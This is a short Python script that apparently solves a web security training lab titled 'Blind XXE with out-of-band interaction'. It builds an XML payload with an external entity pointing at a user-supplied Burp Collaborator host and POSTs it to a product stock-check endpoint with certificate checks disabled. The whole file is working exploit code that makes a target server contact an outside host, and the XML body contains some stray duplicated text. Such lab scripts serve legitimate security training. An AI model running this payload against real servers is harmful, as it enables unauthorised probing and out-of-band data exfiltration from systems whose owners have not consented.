import requests
import urllib3
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Blind XXE with out-of-band interaction"

def run(url, payload, proxies=None):
    url = url.rstrip('/')
    paths = ["/"]
    headers = {"Content-Type": "application/xml"}
    print(Fore.WHITE + "Injection point: " + Fore.YELLOW + "productId")
    user_input = input("[?] Enter the Burp Collaborator URL: ").strip()


    print(Fore.WHITE + "Using an external entity to issue a DNS lookup to burp collaborator")

    payload = f"""<?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://{user_input}">]>
                <stockCheck>
                    <productId>
                        &xxe;
                    </productId>
                    <storeId>
                        1
                    </storeId>external entities
                    external entities
                </stockCheck>"""

    try:
        injection = requests.post(
            f"{url}/product/stock", data=payload, headers=headers, verify=False, proxies=proxies)
        return True

    except Exception as e:
        print(f"[!] Failed to check stock with the injected payload through exception")
        return False
